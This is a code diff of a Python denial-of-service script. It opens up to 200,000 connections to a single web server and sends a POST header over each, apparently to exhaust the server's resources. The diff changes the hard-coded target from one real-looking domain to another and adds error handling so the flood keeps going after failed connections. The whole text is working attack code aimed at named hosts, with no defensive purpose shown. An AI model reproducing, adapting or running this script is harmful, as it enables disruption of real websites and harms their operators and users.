@@ -7,7 +7,7 @@ import threading
 # ---------------------------
 MAX_CONN = 200000
 PORT = 80
-HOST = "www.chinasummer.org"
+HOST = "hnds.203ds.cn"
 PAGE = "/"
 # ---------------------------
 buf = ("POST %s HTTP/1.1\r\n"
@@ -22,14 +22,14 @@ def conn_thread():
     global socks
     for i in range(0, MAX_CONN):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # try:
-        s.connect((HOST, PORT))
-        s.send(buf.encode('utf8'))
-        # print("[+] Send buf OK!,conn=%d\n" % i)
-        socks.append(s)
-        # except Exception as ex:
-        #     print("[-] Could not connect to server or send error:%s" % ex)
-    #     time.sleep(2)
+        try:
+            s.connect((HOST, PORT))
+            s.send(buf.encode('utf8'))
+            # print("[+] Send buf OK!,conn=%d\n" % i)
+            socks.append(s)
+        except Exception as ex:
+            print("[-] Could not connect to server or send error:%s" % ex)
+            time.sleep(5)
 
 
 # end def
